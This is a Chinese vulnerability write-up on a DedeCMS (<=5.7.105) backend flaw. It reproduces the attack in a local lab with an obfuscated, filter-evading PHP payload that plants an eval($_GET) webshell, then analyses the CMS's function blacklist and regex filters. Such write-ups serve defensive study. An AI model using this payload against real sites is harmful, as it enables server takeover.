## 影响版本

漏洞影响版本： <=DedeCMS v5.7.105

## 环境搭建

下载dedecms v5.7.105版本或其以下的源码（可以去官网或者GitHub上下载）  
这里我用的就是5.7.105版本的  
然后用phpstudy搭建环镜

## 漏洞复现

搭建好环境之后 注册一个账号 然后登录后台  
第一步，按照下面步骤新建一个模板

![](./img/351793123522809157.png)

在下方的框里写上如下内容

    
    
    <?php
    "\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"('./shell.php', "<?php eva" . "l(\$_GE" . "T[a]);");
    // file_put_contents('./shell.php', "<?php eval($_GET[a]);");

![](./img/1991615689199809772.png)

第二步，按照下面步骤新建一个页面

![](./img/2364638906446074541.png)

这里新建页面的时候，主要注意的就是那个文件名的后缀要写成.`.php`，然后模板文件名那里的`htm`文件，写之前新建模板里的`htm`（是否编译那里是或者否都可以）  
这里会把htm文件里的内容写入到新建的php文件里

![](./img/4679587542913001045.png)

然后访问

    
    
    http://localhost/DedeCMS-V5.7.105-UTF8/uploads/a/1.php

此时会在a目录下生成一个shell.php文件  
内容为:

    
    
    <?php eval($_GET[a]);");

然后测试一下

    
    
    http://localhost/DedeCMS-V5.7.105-UTF8/uploads/a/shell.php?a=phpinfo();

成功利用

![](./img/4142984317768428621.png)

再测测，确实没问题

![](./img/926266809639233943.png)

## 漏洞成因分析

首先我们看到创建模板页面，看到创建模板的接口调用的是是tpl.php文件

![](./img/9167790829453559191.png)

uploads/dede/tpl.php文件，截取主要的部分然后加了一些注释

    
    
    /*
     (/\*)[\s\S]*(\*/)#i 是一个正则表达式模式，表示要匹配的内容。
     其中，/\*和 \*/表示分别匹配开头的 "/" 和结尾的 "/" 符号，[\s\S]* 表示匹配任意空白字符或非空白字符，i 表示忽略大小写。
     这个正则表达式的作用是查找 $content 变量中所有以 "/" 开头、以 "/" 结尾的注释，并将其替换为空字符串。这样可以从文本中删除所有的注释内容。
     */
    $content = preg_replace("#(/\*)[\s\S]*(\*/)#i", '', $content);
    
    // 黑名单正则匹配，禁了下面这些函数
    global $cfg_disable_funs;
    $cfg_disable_funs = isset($cfg_disable_funs) ? $cfg_disable_funs : 'phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,fsockopen,fopen,fwrite,preg_replace';
    $cfg_disable_funs = $cfg_disable_funs.',[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,create_function,array_map,call_user_func,call_user_func_array,array_filert';
    
    foreach (explode(",", $cfg_disable_funs) as $value) {
        //将 `$value` 变量中的所有空格字符（包括空格、制表符和换行符等）都删除。
        $value = str_replace(" ", "", $value);
        if(!empty($value) && preg_match("#[^a-z]+['\"]*{$value}['\"]*[\s]*[([{]#i", " {$content}") == TRUE) {
            $content = dede_htmlspecialchars($content);
            die("DedeCMS提示：当前页面中存在恶意代码！<pre>{$content}</pre>");
        }
      }
        /*
        如果 $content 的开头部分包含 "<?"、"<?php" 或 "<?=" 等 PHP 代码标识符，并且标识符后跟着一个或多个空白字符，则条件成立。即就是匹配php代码的头
        */
    
        if(preg_match("#^[\s\S]+<\?(php|=)?[\s]+#i", " {$content}") == TRUE) {
        //这里的U为惰性匹配 匹配函数变量执行，例如$a="phpinfo"，则$a()就会被匹配
        if(preg_match("#[$][_0-9a-z]+[\s]*[(][\s\S]*[)][\s]*[;]#iU", " {$content}") == TRUE) {
            $content = dede_htmlspecialchars($content);
            die("DedeCMS提示：当前页面中存在恶意代码！<pre>{$content}</pre>");
        }
        // 就是在上一个匹配前加了一个@，防止报错
        if(preg_match("#[@][$][_0-9a-z]+[\s]*[(][\s\S]*[)]#iU", " {$content}") == TRUE) {
            $content = dede_htmlspecialchars($content);
            die("DedeCMS提示：当前页面中存在恶意代码！<pre>{$content}</pre>");
        }
        // 匹配反引号`，防止命令执行
        if(preg_match("#[`][\s\S]*[`]#i", " {$content}") == TRUE) {
            $content = dede_htmlspecialchars($content);
            die("DedeCMS提示：当前页面中存在恶意代码！<pre>{$content}</pre>");
        }
         }

然后这些过滤不算很严格，我们还是有很多方法可以去绕过的，比如我们上面的漏洞复现的时候写入的代码就可以绕过这些限制  
然后看到编辑模板的地方  
可以看到这里要求我们的模板结尾必须是`.htm`，而且还将一些表单标签的关键字进行了替换

    
    
    else if($action == 'saveedit')  
    {  
    csrf_check();  
    if($filename == '')  
    {  
    ShowMsg('未指定要编辑的文件或文件名不合法', '-1');  
    exit();  
    }  
    if(!preg_match("#\.htm$#", $filename))  
    {  
    ShowMsg('DEDE模板文件，文件名必须用.htm结尾！', '-1');  
    exit();  
    }  
    $content = stripslashes($content);  
    $content = preg_replace("/##textarea/i", "<textarea", $content);  
    $content = preg_replace("/##\/textarea/i", "</textarea", $content);  
    $content = preg_replace("/##form/i", "<form", $content);  
    $content = preg_replace("/##\/form/i", "</form", $content);  
    $truefile = $templetdird.'/'.$filename;  
    $fp = fopen($truefile, 'w');  
    fwrite($fp, $content);  
    fclose($fp);  
    ShowMsg('成功修改或新建文件', 'templets_main.php?acdir='.$acdir);  
    exit();  
    }

然后看到新建页面的源码

![](./img/4207198547153713434.png)

`templets_one_add.php`前面都是在对新建页面的内容进行一个处理，我们在新建页面的时候并没有另外写内容，所以前面都不用管，我们看到这里对新建页面进行了一个保存

![](./img/6862766634758489206.png)

那我们就来到`uploads/include/arc.sgpage.class.php`的`SavaToHtml`方法。这个函数主要作用是将当前对象的内容保存为HTML文件。

![](./img/7752285504698696272.png)

然后进入`uploads/include/dedetag.class.php`的`SaveTo`方法，这个函数的作用是将替换后的字符串保存到指定的文件中，即获取文件内容。

![](./img/5337537868009502636.png)

最后看到`GetResult`方法，这个方法用于替换模板内容中的字符串，即将一个字符串中的特定标签替换为对应的值，然后返回替换后的字符串。

![](./img/210936359383895238.png)

这个漏洞的成因简单来说，就是没有对用户新建的文件的名字是否合法做出判断，而且对文件内容的过滤也不完全，所以导致用户可以通过恶意输入进行利用。

